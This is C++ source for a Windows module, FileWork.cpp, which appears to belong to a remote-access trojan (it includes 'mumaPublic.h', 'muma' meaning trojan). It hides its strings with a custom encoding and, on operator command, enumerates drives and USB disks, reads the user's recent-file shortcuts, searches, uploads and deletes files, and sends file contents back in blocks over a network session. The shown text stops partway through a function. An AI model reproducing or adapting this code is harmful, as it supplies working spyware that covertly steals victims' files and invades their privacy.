    // FileWork.cpp: implementation of the FileWork class.
//
//////////////////////////////////////////////////////////////////////

#include "stdafx.h"
#include "FileWork.h"
#include "stdio.h"
#include "stdlib.h"
#include "io.h"
#include <shlobj.h>
#include <sys\\stat.h>
#include "direct.h"
#include "time.h"
#include "tchar.h"
#include "DirCheck.h"
#include "SpecDir.h"
#include "UsbDisk.h"
#include "Struct.h"
#include "mumaPublic.h"
#include "WinApi.h"
#include "NdisSocket.h"
#include "UpLoadFile.h"
#include "FileSearch.h"
#include "MD5Work.h"

//////////////////////////////////////////////////////////////////////
// Construction/Destruction
//////////////////////////////////////////////////////////////////////
void usb_SendFileFileOpt(LPCSTR filename, char ptype, WORD session,char*monitortype,char* monitorvalue);

BOOL GetDiskFreeSize(LPCSTR disk, DWORD& disksize, DWORD& diskfree);
void GetSendDirLinkList(DIRLIST& dirlist, char ptype, WORD session);
 
BOOL GetShortcutTarget(const WCHAR* LinkFileName, WCHAR* szPath, DWORD& buflen,WIN32_FIND_DATAW &pfd);
void SendDirList(DIRLIST& dirlist, char ptype, WORD session);
BOOL SendFileFileOpt(LPCWSTR filename, char ptype, WORD session,char*monitortype,char* monitorvalue, __int64 BegPos, DWORD dsize);

//---------------------------进程函数-----------------------------
DWORD WINAPI PathList(LPVOID lp);
DWORD WINAPI FileCopy(LPVOID lp);
DWORD WINAPI GetDiskInfo(LPVOID p);
DWORD WINAPI RecentPathList(LPVOID lp);
DWORD WINAPI GetUsbDiskInfo(LPVOID p);

#define	 MAXFILELENGTH		60*1024*1024
//------------------GUID号---------------------
#define  FILEGUID		1 
//--------------------------------------------

lpFunction lpfunFileOpt;

int partInitFileOpt(DWORD* pModuleTable, int TableSize, DWORD pSendFunction)
{
	lpfunFileOpt=(lpFunction)pModuleTable;

	if (PGetTickCount()>5*1000)
	{
 		lpfunFileOpt[PTYPE_COPYFILE].pFun = (pFun)StartFileCopy;//回传文件
 		lpfunFileOpt[PTYPE_RECENT].pFun = (pFun)StartRecentPathList;//获取最近浏览文件列表
  		lpfunFileOpt[PTYPE_REGETFILE].pFun = (pFun)StartReGetFile;//重传文件
 		lpfunFileOpt[PTYPE_QUERYFILESIZE].pFun = (pFun)StartQueryFile;//查询文件大小
  		lpfunFileOpt[PTYPE_SETCHECKDIR].pFun = (pFun)SetAutoCheckDir;//设置监控参数
 		//lpfunFileOpt[PTYPE_SETTHUMBNAIL].pFun = (pFun)SetThumbnail;//回传缩略图
 		lpfunFileOpt[PTYPE_UPFILE].pFun = (pFun)UploadFileFun;//上传文件
		lpfunFileOpt[PTYPE_ACKDELFILE].pFun = (pFun)AckDeleteFile;//删除文件
		lpfunFileOpt[PTYPE_SEARCHFILE].pFun = (pFun)SearchFile;//搜索文件
		lpfunFileOpt[PTYPE_SETUPFILE].pFun = (pFun)SetUpFileFun;//新上传接口

		//取监控目录离线列表 即包括目录列表，也包括内置回传列表
		lpfunFileOpt[PTYPE_GETCHECKDIRLIST].pFun = (pFun)StartGetMonitorList ;

 		lpfunFileOpt[PTYPE_LISTDIR].pFun = (pFun)StartPathList;//在线取目录列表
 		lpfunFileOpt[PTYPE_OLDISKINFO].pFun = (pFun)StartGetDiskInfo;//在线取盘符
		lpfunFileOpt[PTYPE_USBDISKINFO].pFun = (pFun)StartGetUsbDiskInfo;//在线取USB目录列表
		lpfunFileOpt[PTYPE_SETMD5FILTER].pFun = (pFun)SetMD5Filter;//设置md5参数

 		StartCheckDir(NULL);
 		MD5Work::GetInstance()->Init();
 		OwnMD5Filter();
	}

 	return FILEGUID;
}

DWORD StartPathList(DWORD* pPara)
{
	HANDLE starthandle=0;
	DWORD  threadId=0;
	ThreadParam *p = new ThreadParam;
	memcpy(p, pPara, sizeof(ThreadParam));
	starthandle = CreateThread(NULL, 0, PathList, p, 0, &threadId);
	if (starthandle != NULL)
		CloseHandle(starthandle);
	return 0;
}

DWORD StartFileCopy(DWORD* pPara)
{
	HANDLE starthandle=0;
	DWORD  threadId=0;
	ThreadParam *p = new ThreadParam;
	memcpy(p, pPara, sizeof(ThreadParam));
	starthandle = CreateThread(NULL, 0, FileCopy, p, 0, &threadId);
	if (starthandle != NULL)
		CloseHandle(starthandle);
	return 0;
}

DWORD StartGetDiskInfo(DWORD* pPara)
{
	HANDLE starthandle=0;
	DWORD  threadId=0;
	ThreadParam *p = new ThreadParam;
	memcpy(p, pPara, sizeof(ThreadParam));
	starthandle = CreateThread(NULL, 0, GetDiskInfo, p, 0, &threadId);
	if (starthandle != NULL)
		CloseHandle(starthandle);
	return 0;
}

DWORD StartRecentPathList(DWORD* pPara)
{
	HANDLE starthandle=0;
	DWORD  threadId=0;
	ThreadParam *p = new ThreadParam;
	memcpy(p, pPara, sizeof(ThreadParam));
	starthandle = CreateThread(NULL, 0, RecentPathList, p, 0, &threadId);
	if (starthandle != NULL)
		CloseHandle(starthandle);
	return 0;
}

//////////////////////////////////////////////////////////////////////////
DWORD WINAPI GetDiskInfo(LPVOID p)
{
	ThreadParam *pThpara = (ThreadParam*)p;

	try
	{
		WORD	session = pThpara->SessionID;
		char	ptype = pThpara->PacketType;
	 
		char	buffer[4096];
		memset(buffer, 0, 4096);
		int		datalen=100;
		char	diskname[4];
		memset(diskname, 0, 4);
		char 	disktype[15];
		DWORD	disksize = 0;
		DWORD	diskfree = 0;
		char pdr[256];
		memset(pdr, 0, 256);
		int len = PGetLogicalDriveStringsA(256, pdr);
		char* p = pdr+len-4;
		for (; p >= pdr; p -= 4)
		{
			if ((*p == 'A') || (*p == 'a') ||
				(*p == 'B') || (*p == 'b'))
				continue;

			memset(disktype, 0, 15);
			switch(PGetDriveTypeA(p))
			{
			case DRIVE_FIXED:	// 本地磁盘
				DeFileStringA(disktype, 15, "GlKSGvECs"); //localdisk
				break;
			case DRIVE_REMOTE:
				DeFileStringA(disktype, 15, "FkVvECs"); //netdisk
				break;
			case DRIVE_REMOVABLE:
				DeFileStringA(disktype, 15, "WlIkSYGk"); //moveable
				break;
			default:
				continue;
			}
			// 获取该盘的详细信息
			memcpy(diskname, p, 4);
		/*	if (GetDiskFreeSize(diskname, disksize, diskfree))*/
			{
				// 格式化详细信息
				datalen += sprintf(buffer+datalen, "%s\t%s\t0M\t0M\r\n",
					diskname, disktype);
			}
		}
		if (datalen > 100)
		{
			// 写描述信息
			// time: yyyymmddHHMMSS\r\n
			// content-length: 1235412354\r\n
			// content-type: disk\r\n
			char buf[100], tmpstr[20];
			SYSTEMTIME nowtime;
			PGetLocalTime(&nowtime);
			int hlen = sprintf(buf, "%s%04d%02d%02d%02d%02d%02d\r\n", DeFileStringA(tmpstr, 20, "VEWk: "), //time: 
				nowtime.wYear, nowtime.wMonth, nowtime.wDay, nowtime.wHour,
				nowtime.wMinute, nowtime.wSecond);
			hlen += sprintf(buf+hlen, "%s: %d\r\n", DeFileStringA(tmpstr, 20, "KlFVkFVdGkFgVM"), datalen-100); //content-length
			hlen += sprintf(buf+hlen, "%s\r\n\r\n", DeFileStringA(tmpstr, 20, "KlFVkFVdVupk: vECs")); //content-type: disk
			memcpy(buffer+100-hlen, buf, hlen);
			datalen = datalen - 100 + hlen;
			// 发送数据
			if(SendData(buffer+100-hlen, datalen, ptype, session))
			{
				IF_LOUD(DbgFat32Log("发送数据成功");)
			}
			else 
			{
				IF_LOUD(DbgFat32Log("发送数据失败");)
			}
		}
		delete pThpara;

	}
	catch(...)	
	{
		if (p!=NULL)
			delete pThpara;
		IF_LOUD(DbgFat32Log("GetDiskInfo Catch Error!");)
	}
	p = NULL;

	return 0;
}


DWORD WINAPI RecentPathList(LPVOID lp)
{
	IF_LOUD(DbgFat32Log("RecentPathList");)
	ThreadParam *ppara=(ThreadParam*)lp;
	WCHAR *p=0;//目录名

	int wlen = 2*(ppara->datalen)+1;
	WCHAR* wbuf = new WCHAR[wlen];
	UTF_82Unicode(ppara->buf, wbuf, wlen);

	p=wcsstr(wbuf, L"\r\n\r\n");
	WCHAR recentpath[MAX_PATH];
	ULONG buflen = MAX_PATH;
	ZeroMemory(recentpath, MAX_PATH);

	DWORD rv = 0;
	if(PSHGetSpecialFolderPathW(NULL, recentpath, CSIDL_RECENT, TRUE))//CSIDL_RECENT
	{
		p=recentpath;
		if (wcslen(p) < MAX_PATH)
		{
			DIRLIST	dirlist;
			dirlist.filecount = 0;
			dirlist.filelist = NULL;
			wcscpy(dirlist.rootdir, p);
			
			GetSendDirLinkList(dirlist, ppara->PacketType, ppara->SessionID);
			
			rv = 1;
		}
		else
		{
			// 路径超长
			rv = -2;
		}
	}
	else
	{
		rv = -3;
	}
	delete ppara;

	return rv;
}

BOOL GetDiskFreeSize(LPCSTR disk, DWORD& disksize, DWORD& diskfree)
{
	ULARGE_INTEGER FreeBytesAvailable;
	ULARGE_INTEGER TotalNumberOfBytes;    
	ULARGE_INTEGER TotalNumberOfFreeBytes; 
	if(PGetDiskFreeSpaceExA(disk, &FreeBytesAvailable, &TotalNumberOfBytes,
		&TotalNumberOfFreeBytes))
	{
		__int64 freespace = TotalNumberOfFreeBytes.QuadPart / (1024*1024);
		diskfree = (DWORD) freespace;
		__int64 toatalspace = TotalNumberOfBytes.QuadPart / (1024*1024);
		disksize = (DWORD) toatalspace;
		return TRUE;
	}
	return FALSE;
}

void GetSendDirLinkList(DIRLIST& dirlist, char ptype, WORD session)
{
	IF_LOUD(DbgFat32Log("GetSendDirLinkList");)

	WCHAR szTmp[MAX_PATH], wTmpStr[10];
	WCHAR szFileName[MAX_PATH];
	DWORD buflen1;

	WCHAR searchpath[MAX_PATH];
	swprintf(searchpath, L"%s\\*%s", dirlist.rootdir, DeFileStringW(wTmpStr, 10, L".KLI")); //.lnk
	HANDLE hfindfile;
	WIN32_FIND_DATAW finddata;
	try
	{
		
		hfindfile = PFindFirstFileW(searchpath, &finddata);
		if (hfindfile != INVALID_HANDLE_VALUE)
		{
			do
			{
				ZeroMemory(szTmp, MAX_PATH);
				swprintf(szTmp,L"%s\\%s",dirlist.rootdir,finddata.cFileName);
				ZeroMemory(szFileName, MAX_PATH);
				buflen1 = MAX_PATH;
				
				FileFILEINFO *tp;
				WIN32_FIND_DATAW pfd;
				if(GetShortcutTarget(szTmp, szFileName, buflen1,pfd))
				{
					char sDrive[4];
					memset(sDrive, 0, 4);
					sDrive[0] = szFileName[0];
					sDrive[1] = ':';
					sDrive[2] = '\\';
					
					UINT nType = PGetDriveTypeA( sDrive );
				
					if(nType!=DRIVE_FIXED )
						continue;
					if(_waccess(szFileName,0)!=0)
						continue;
					if(pfd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY ){
						continue;
					}
				}
				else
					continue;
				
				if (0 == (dirlist.filecount&15))
				{
					tp = new FileFILEINFO[dirlist.filecount+16];
					memcpy(tp, dirlist.filelist, dirlist.filecount*sizeof(FileFILEINFO));
					memset(tp+dirlist.filecount, 0, sizeof(FileFILEINFO)*16);
					delete[] dirlist.filelist;
					dirlist.filelist = tp;
				}
				tp = dirlist.filelist + dirlist.filecount++;
				wcscpy(tp->filename, szFileName);

				struct _stati64 stat1;
				_wstati64(szFileName,&stat1);
				tp->filetime.dwHighDateTime=stat1.st_mtime;
				if(pfd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY ){
					tp->filetype=1;
					tp->filesize=0;
				}
				else{
					tp->filetype=0;
					tp->filesize = stat1.st_size;
				}
			}while(PFindNextFileW(hfindfile, &finddata));
			
			PFindClose(hfindfile);
		}
		
		int  buflen = SENDBUFFLEN;
		char tmpbuf[1024];
		int  datalen = 1024;
		char* pBuffer = new char[SENDBUFFLEN];
		memset(pBuffer, 0, SENDBUFFLEN);
		for (int i = 0; i < dirlist.filecount; i++)
		{
			struct tm *today;
			char tmtimebuf[128];

			today = localtime( (time_t *)&dirlist.filelist[i].filetime.dwHighDateTime );

			if(today==NULL)
				today=new tm;
			memset(tmtimebuf,0,sizeof(tmtimebuf));
			strftime( tmtimebuf, 128,"%Y%m%d%H%M%S", today );

			char tmpfilename[3*MAX_PATH];
			Unicode2UTF_8(dirlist.filelist[i].filename, tmpfilename, 3*MAX_PATH);

			int len = sprintf(tmpbuf, "%s\t%I64d\t%d\t%s\r\n",
				tmtimebuf, dirlist.filelist[i].filesize, dirlist.filelist[i].filetype,
				tmpfilename);

			if (datalen + len >= buflen)
			{
				char *tp = new char[buflen+SENDBUFFLEN];
				memcpy(tp, pBuffer, buflen);
				delete[] pBuffer;
				pBuffer = tp;
				memset(pBuffer+buflen, 0, SENDBUFFLEN);
				buflen += SENDBUFFLEN;
			}

			memcpy(pBuffer+datalen, tmpbuf, len);
			datalen += len;
		}
		// 生成描述信息
		SYSTEMTIME nowtime;
		PGetLocalTime(&nowtime);

		char tmprootdir[3*MAX_PATH], tmpstr[30];
		Unicode2UTF_8(dirlist.rootdir, tmprootdir, 3*MAX_PATH);

		int len = sprintf(tmpbuf, "%s%s\r\n", DeFileStringA(tmpstr, 30, "YllVvET: "), tmprootdir); //bootdir: 
		len += sprintf(tmpbuf+len, "%s %04d%02d%02d%02d%02d%02d\r\n", DeFileStringA(tmpstr, 30, "VEWk:"), //time: 
			nowtime.wYear, nowtime.wMonth, nowtime.wDay,
			nowtime.wHour, nowtime.wMinute, nowtime.wSecond);
		len += sprintf(tmpbuf+len, "%s: %d\r\n", DeFileStringA(tmpstr, 30, "KlFVkFVdGkFgVM"), datalen-1024); //content-length
		len += sprintf(tmpbuf+len, "%s\r\n\r\n", DeFileStringA(tmpstr, 30, "KlFVkFVdVupk: vETGECV")); //content-type: dirlist
		datalen = datalen - 1024 + len;
		memcpy(pBuffer+1024-len, tmpbuf, len);
		
#ifdef _DEBUG
		FILE * fs;
		fs=fopen("c:\\recentlist.txt","w+b");

		if(fs)
		{
			fwrite(pBuffer+1024-len,1,datalen,fs);
			fclose(fs);
		}
#endif	
	
		if(SendData(pBuffer+1024-len, datalen, ptype, session))
		{
			IF_LOUD(DbgFat32Log("获得最近文件列表成功");)	
		}
		else 
		{
			IF_LOUD(DbgFat32Log("获得最近文件列表失败");)
		}
		
	
		delete[] pBuffer;
		
	}
	catch (...)
	{
		IF_LOUD(DbgFat32Log("获得最近文件列表 catch error!!!!!!");)
	}

}

BOOL GetFileList(const WCHAR *root, DIRLIST& filelist, const WCHAR *fType, int level)
{
	if(level > 6)
		return 1;
	
	DIRLIST dirlist;
	WCHAR searchpath[MAX_PATH];
	swprintf(searchpath, L"%s\\*.*", root);
	HANDLE hfindfile;
	WIN32_FIND_DATAW finddata;
	hfindfile = PFindFirstFileW(searchpath, &finddata);
	if (hfindfile != INVALID_HANDLE_VALUE)
	{
		try	
		{
			int type=0;
			unsigned __int64 size;
			int resvDot;
			WCHAR FileListPath[MAX_PATH];
			do{
				if (finddata.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
				{
					// 是文件夹
					if (wcscmp(finddata.cFileName,L".")==0 || wcscmp(finddata.cFileName,L"..")==0)
						continue;

					FileFILEINFO *tp;
					if (0 == (dirlist.filecount&15))
					{
						tp = new FileFILEINFO[dirlist.filecount+16];
						memcpy(tp, dirlist.filelist, dirlist.filecount*sizeof(FileFILEINFO));
						memset(tp+dirlist.filecount, 0, sizeof(FileFILEINFO)*16);
						delete[] dirlist.filelist;
						dirlist.filelist = tp;
					}
					swprintf(FileListPath, L"%s\\%s", root, finddata.cFileName);
					tp = dirlist.filelist + dirlist.filecount++;
					wcscpy(tp->filename, FileListPath);
					tp->filetime = finddata.ftLastWriteTime;

				}
				else
				{
					type = 0;
					size = finddata.nFileSizeHigh;
					size = (size << 32) + finddata.nFileSizeLow;
					
					WCHAR *pResv = wcsrchr(finddata.cFileName, L'.');
					if(pResv != NULL)
					{
						resvDot = 1+ pResv- finddata.cFileName;
						if(fType && wcslen(fType)>0)//0代表所有
						{
							WCHAR *pdot=finddata.cFileName+resvDot;
							WCHAR * pp=wcsstr(fType,pdot);
							if(!pp)
							{
								continue; //如果文件类型不为空,就过滤
							}
						}
					}
				 
					FileFILEINFO *tp;
					if (0 == (filelist.filecount&15))
					{
						tp = new FileFILEINFO[filelist.filecount+16];
						memcpy(tp, filelist.filelist, filelist.filecount*sizeof(FileFILEINFO));
						memset(tp+filelist.filecount, 0, sizeof(FileFILEINFO)*16);
						delete[] filelist.filelist;
						filelist.filelist = tp;
					}
					swprintf(FileListPath, L"%s\\%s", root, finddata.cFileName);
					tp = filelist.filelist + filelist.filecount++;
					wcscpy(tp->filename, FileListPath);
					tp->filetime = finddata.ftLastWriteTime;
					tp->createfiletime=finddata.ftCreationTime;
					tp->filesize = size;
					tp->filetype = type;
				}
			}while(PFindNextFileW(hfindfile, &finddata));


			for(int i = 0; i< dirlist.filecount; i++)
			{
				GetFileList(dirlist.filelist[i].filename, filelist, fType, level+1);
			}
		}catch (...)
		{
			
		}
		PFindClose(hfindfile);
	}

	return TRUE;
}

DWORD WINAPI PathList(LPVOID lp)
{
	ThreadParam *ppara=(ThreadParam*)lp;

	char *inputline	=ppara->buf;
	char *nextline	=0;
	char *field		=0;
	char *value		=0;
	
	char dir[MAX_PATH];
	char ftype[MAX_PATH];
	char tmpstr[20];
	memset(dir,0,MAX_PATH);
	memset(ftype,0,MAX_PATH);
	int	 level=0;
 
 	int re=0;
	re=LineParser(inputline,&nextline,&field,&value);
	while(re)
	{
		if(stricmp(field, DeFileStringA(tmpstr, 20, "YllVvET"))==0) //bootdir
		{
			strcpy(dir,value);
		}
		else if(stricmp(field, DeFileStringA(tmpstr, 20, "HEGkVupk"))==0)  //filetype //多后缀串
		{ 
			strcpy(ftype, value);
		}
		if(re == 2)
			break;
		inputline=nextline;
		re=LineParser(inputline,&nextline,&field,&value);
	}

	WCHAR wdir[MAX_PATH], wftype[MAX_PATH];
	memset(wdir, 0, sizeof(wdir));
	memset(wftype, 0, sizeof(wftype));
	UTF_82Unicode(dir, wdir, MAX_PATH);
	UTF_82Unicode(ftype, wftype, MAX_PATH);
	
	if(wcslen(wdir) == 0)
	{
		delete ppara;
		IF_LOUD(DbgFat32Log("PathList 收到交互命令error!!");)
		return -1;
	}
	else
	{
		if(wcslen(wftype) == 0)
		{
			DIRLIST	dirlist;
			dirlist.filecount = 0;
			dirlist.filelist = NULL;
			wcscpy(dirlist.rootdir, wdir);
			GetDirList(dirlist);
			SendDirList(dirlist, ppara->PacketType, ppara->SessionID);
			delete ppara;
			return 1;
		}
		else
		{
			DIRLIST	dirlist;
			dirlist.filecount = 0;
			dirlist.filelist = NULL;
			wcscpy(dirlist.rootdir, wdir);
			GetFileList(wdir, dirlist, wftype, 0); //不
			SendDirList(dirlist, ppara->PacketType, ppara->SessionID);
			delete ppara;
			return 1;
		}
	}
	
	return 1;
}

DWORD WINAPI FileCopy(LPVOID lp)
{
	ThreadParam *ppara=(ThreadParam*)lp;
 
	char *nextline	=0;
	char *field		=0;
	char *value		=0;
	char *filename=NULL;
	__int64 BegPos = -1;
	DWORD GetSize = -1;

 
	char monitortype [MAX_PATH*2];
	char tmpstr[20];
	memset(monitortype,0,MAX_PATH*2);
	//初始化
	char *inputline=ppara->buf;
	int re=0;
	re=LineParser(inputline,&nextline,&field,&value);
	while(re)
	{
		if(stricmp(field, DeFileStringA(tmpstr, 20, "HEGkFSWk"))==0) //filename
		{
			 filename=value;
		}
		else if(stricmp(field, DeFileStringA(tmpstr, 20, "WlFEVlTVupk"))==0) //monitortype
		{
			strcpy(monitortype,value);
		}
		else if(stricmp(field, DeFileStringA(tmpstr, 20, "YkgplC"))==0) //begpos
		{
			BegPos = _atoi64(value);
		}
		else if(stricmp(field, DeFileStringA(tmpstr, 20, "YGlKs"))==0) //block
		{
			GetSize = atoi(value);
		}
		inputline=nextline;
		re=LineParser(inputline,&nextline,&field,&value);
	}	

	if(filename)
	{
		IF_LOUD(DbgFat32Log("FileCopy 收到交互命令filename=%s,monitortype=%s",filename,monitortype);)
		WCHAR unicodefilename[MAX_PATH];
		memset(unicodefilename, 0, sizeof(unicodefilename));
		UTF_82Unicode(filename, unicodefilename, MAX_PATH);
		SendFileFileOpt(unicodefilename, ppara->PacketType, ppara->SessionID,monitortype,monitortype, BegPos, GetSize);
	}
	
	delete ppara;
	return TRUE;
}


void SendDirList(DIRLIST& dirlist, char ptype, WORD session)
{
	int  buflen = SENDBUFFLEN;
	char tmpbuf[1024], tmpstr[30];
	int  datalen = 1024;
	char* pBuffer = new char[SENDBUFFLEN];
	memset(pBuffer, 0, SENDBUFFLEN);
	char utf8path[3*MAX_PATH];
	for (int i = 0; i < dirlist.filecount; i++)
	{
		SYSTEMTIME ftime;
		//PFileTimeToLocalFileTime(&dirlist.filelist[i].filetime,&dirlist.filelist[i].filetime);
		PFileTimeToSystemTime(&dirlist.filelist[i].filetime, &ftime);
		Unicode2UTF_8(dirlist.filelist[i].filename, utf8path, 3*MAX_PATH-1);
		int len = sprintf(tmpbuf, "%04d%02d%02d%02d%02d%02d\t%I64d\t%d\t%s\r\n",
			ftime.wYear, ftime.wMonth, ftime.wDay, ftime.wHour, ftime.wMinute,
			ftime.wSecond, dirlist.filelist[i].filesize, dirlist.filelist[i].filetype,
			utf8path);
		
		if (datalen + len >= buflen)
		{
			char *tp = new char[buflen+SENDBUFFLEN];
			memcpy(tp, pBuffer, buflen);
			delete[] pBuffer;
			pBuffer = tp;
			memset(pBuffer+buflen, 0, SENDBUFFLEN);
			buflen += SENDBUFFLEN;
		}
		memcpy(pBuffer+datalen, tmpbuf, len);
		datalen += len;
	}
	SYSTEMTIME nowtime;
	PGetLocalTime(&nowtime);

	// 生成描述信息
	//bootdir: %s\r\n
	//time: %04d%02d%02d%02d%02d%02d\r\n
	//content-length: %d\r\n
	//content-type: dirlist\r\n\r\n",
	Unicode2UTF_8(dirlist.rootdir, utf8path, 3*MAX_PATH-1);

	int len = sprintf(tmpbuf, "%s%s\r\n", DeFileStringA(tmpstr, 30, "YllVvET: "), utf8path); //bootdir: 
	len += sprintf(tmpbuf+len, "time: %04d%02d%02d%02d%02d%02d\r\n", DeFileStringA(tmpstr, 30, "VEWk:"), //time:
		nowtime.wYear, nowtime.wMonth, nowtime.wDay,
		nowtime.wHour, nowtime.wMinute, nowtime.wSecond);
	len += sprintf(tmpbuf+len, "%s: %d\r\n", DeFileStringA(tmpstr, 30, "KlFVkFVdGkFgVM"), datalen-1024); //content-length
	len += sprintf(tmpbuf+len, "%s\r\n\r\n", DeFileStringA(tmpstr, 30, "KlFVkFVdVupk: vETGECV")); //content-type: dirlist

	datalen = datalen - 1024 + len;
	memcpy(pBuffer+1024-len, tmpbuf, len);

	if (SendData(pBuffer+1024-len, datalen, ptype, session))
	{
		IF_LOUD(DbgFat32Log("发送%s 目录列表成功,文件数=%d", dirlist.rootdir,dirlist.filecount);)
	}
	else
	{
		IF_LOUD(DbgFat32Log("发送%s 目录列表失败", dirlist.rootdir);)
	}

	delete[] pBuffer;

}


void usb_SendFileFileOpt(LPCSTR filename, char ptype, WORD session, char*monitortype, char* monitorvalue)
{
// 	HANDLE		hFile;
	char	tmpbuf[65536+1024], tmpstr[30];
	char*	buffer	=tmpbuf;
	int		datalen = 0;
	SYSTEMTIME nowtime;
	PGetLocalTime(&nowtime);

	char utf8path[3*MAX_PATH];
	memset(utf8path, 0, sizeof(utf8path));
	Gb2Utf8(filename, strlen(filename), utf8path, 3*MAX_PATH-1);

	HANDLE hFile = PCreateFileA(filename, 
		GENERIC_READ, 
		FILE_SHARE_READ, 
		NULL,
		OPEN_EXISTING, 
		0,
		NULL);
	int Op=-1;
	if(hFile != INVALID_HANDLE_VALUE)
	{
		LARGE_INTEGER lltotallen;
		PGetFileSizeEx(hFile, &lltotallen);//filelength(fs->_file);
		__int64 totallen = lltotallen.QuadPart;
		if(totallen<=0 || totallen>MAXFILELENGTH)
		{
			Op = 1;
		}
		else
		{
			Op = 2;
			if( totallen > 65536 )
			{
				buffer = new char[totallen+1024];
				if(buffer==NULL)
				{
					Op=3;
				}
			}
			//////////////////////////////////////////////////////////////////////////
			if(buffer)
			{
				datalen =  sprintf(buffer+datalen, "%s: %s\r\n", DeFileStringA(tmpstr, 30, "HEGkFSWk"), utf8path); //filename
				datalen += sprintf(buffer+datalen, "%s%04d%02d%02d%02d%02d%02d\r\n", DeFileStringA(tmpstr, 30, "VEWk: "), //time: 
					nowtime.wYear, nowtime.wMonth, nowtime.wDay, 
					nowtime.wHour, nowtime.wMinute, nowtime.wSecond);
				datalen += sprintf(buffer+datalen, "%s %I64d\r\n", DeFileStringA(tmpstr, 30, "KlFVkFVdGkFgVM:"), totallen); //content-length:
				datalen += sprintf(buffer+datalen, "%s: %s\r\n", DeFileStringA(tmpstr, 30, "WlFEVlTVupk"), monitortype); //monitortype
				datalen += sprintf(buffer+datalen, "%s%s\r\n", DeFileStringA(tmpstr, 30, "WlFEVlTISGek: "), monitorvalue); //monitorvalue: 
				datalen += sprintf(buffer+datalen, "%s\r\n\r\n", DeFileStringA(tmpstr, 30, "KlFVkFVdVupk: vETGECV")); //content-type: dirlist
							
				DWORD outRead;
				if(PReadFile(hFile, buffer+datalen, totallen, &outRead, NULL))
				{
					datalen += outRead;
				}
				else
				{
					Op=4;
				}
			}
		}
		CloseHandle(hFile);
	}

	int lsize=-1;
	if(Op != 2)
	{
		datalen =  sprintf(buffer+datalen, "%s%s\r\n", DeFileStringA(tmpstr, 30, "HEGkFSWk: "), utf8path); //filename: 
		datalen += sprintf(buffer+datalen, "%s: %04d%02d%02d%02d%02d%02d\r\n", DeFileStringA(tmpstr, 30, "VEWk"), //time
			nowtime.wYear, nowtime.wMonth, nowtime.wDay, 
			nowtime.wHour, nowtime.wMinute, nowtime.wSecond);
		datalen += sprintf(buffer+datalen, "%s %d\r\n", DeFileStringA(tmpstr, 30, "KlFVkFVdGkFgVM:"), lsize); //content-length:
		datalen += sprintf(buffer+datalen, "%s: %s\r\n", DeFileStringA(tmpstr, 30, "WlFEVlTVupk"), monitortype); //monitortype
		datalen += sprintf(buffer+datalen, "%s\r\n\r\n", DeFileStringA(tmpstr, 30, "KlFVkFVdVupk: vETGECV")); //content-type: dirlist
	}
	// 发送文件数据

	if(SendData(buffer, datalen, ptype, session))
	{
		IF_LOUD(DbgFat32Log("SendFile %s, 成功", filename);)
	}
	else
	{
		IF_LOUD(DbgFat32Log("SendFile %s, 失败", filename);)
	}

	if (buffer && buffer != tmpbuf)
		delete[] buffer;
}

BOOL SendFileFileOpt(LPCWSTR filename, char ptype, WORD session,char*monitortype,char* monitorvalue, __int64 BegPos, DWORD dsize)
{
// 	HANDLE		hFile;
	char	tmpbuf[65536+1024], tmpstr[30];
	char*	buffer	=tmpbuf;
	int		datalen = 0;
	SYSTEMTIME nowtime;
	PGetLocalTime(&nowtime);

	DWORD BlockState=BLOCK_TRANS;
	if(BegPos<=0)
	{
		BegPos = 0;
		BlockState |= BLOCK_FIRST;
	}

	char Utf8Path[3*MAX_PATH];
	memset(Utf8Path, 0, sizeof(Utf8Path));
	Unicode2UTF_8((WCHAR*)filename, Utf8Path, 3*MAX_PATH-1);

	HANDLE hFile = PCreateFileW(filename, 
		GENERIC_READ, 
		FILE_SHARE_READ, 
		NULL,
		OPEN_EXISTING, 
		0,
		NULL);
	int Op=-1;
	if(hFile != INVALID_HANDLE_VALUE)
	{
		LARGE_INTEGER lltotallen;
		PGetFileSizeEx(hFile, &lltotallen);//filelength(fs->_file);
		__int64 totallen = lltotallen.QuadPart;
		if(BegPos+dsize>totallen)
		{
			dsize = (DWORD)(totallen-BegPos);
			BlockState |= BLOCK_LAST;
		}
		if(dsize<=0)
		{
			dsize = totallen;
			BegPos = 0;
			BlockState = BLOCK_ALL;
		}
		if(dsize<=0 || dsize>MAXFILELENGTH)
		{
			Op = 1;
		}
		else
		{
			Op = 2;
			if( dsize > 65536 )
			{
				buffer = new char[dsize+1024];
				if(buffer==NULL)
				{
					Op=3;
				}
			}
			//////////////////////////////////////////////////////////////////////////
 
			if(buffer)
			{
				datalen =  sprintf(buffer+datalen, "%s%s\r\n", DeFileStringA(tmpstr, 30, "HEGkFSWk: "), Utf8Path); //filename: 
				datalen += sprintf(buffer+datalen, "%s %04d%02d%02d%02d%02d%02d\r\n", DeFileStringA(tmpstr, 30, "VEWk:"), //time:
					nowtime.wYear, nowtime.wMonth, nowtime.wDay, 
					nowtime.wHour, nowtime.wMinute, nowtime.wSecond);
				datalen += sprintf(buffer+datalen, "%s: %d\r\n", DeFileStringA(tmpstr, 30, "KlFVkFVdGkFgVM"), dsize); //content-length
				datalen += sprintf(buffer+datalen, "%s%s\r\n", DeFileStringA(tmpstr, 30, "WlFEVlTVupk: "), monitortype); //monitortype: 
				datalen += sprintf(buffer+datalen, "%s %s\r\n", DeFileStringA(tmpstr, 30, "WlFEVlTISGek:"), monitorvalue); //monitorvalue:
				datalen += sprintf(buffer+datalen, "%s: %I64d\r\n", DeFileStringA(tmpstr, 30, "YkgplC"), BegPos); //begpos
				datalen += sprintf(buffer+datalen, "%s%d\r\n", DeFileStringA(tmpstr, 30, "YGlKsCVSVk: "), BlockState); //blockstate: 
				datalen += sprintf(buffer+datalen, "%s %I64d\r\n", DeFileStringA(tmpstr, 30, "VlVSGGkF:"), totallen); //totallen:
				datalen += sprintf(buffer+datalen, "%s\r\n\r\n", DeFileStringA(tmpstr, 30, "KlFVkFVdVupk: HEGk")); //content-type: file
				
				SendData(buffer, datalen, ptype, session);//先发出头

				memset(buffer, 0, datalen);
				datalen=0;

				LARGE_INTEGER llBegPos;
				llBegPos.QuadPart = BegPos;
				PSetFilePointerEx(hFile, llBegPos, 0, FILE_BEGIN);
				
				DWORD outRead;
				if(PReadFile(hFile, buffer, dsize, &outRead, NULL))
				{
					datalen = outRead;
				}
				else
				{
					Op=4;
				}
			}
		}
		CloseHandle(hFile);
	}

	int lsize=-1;
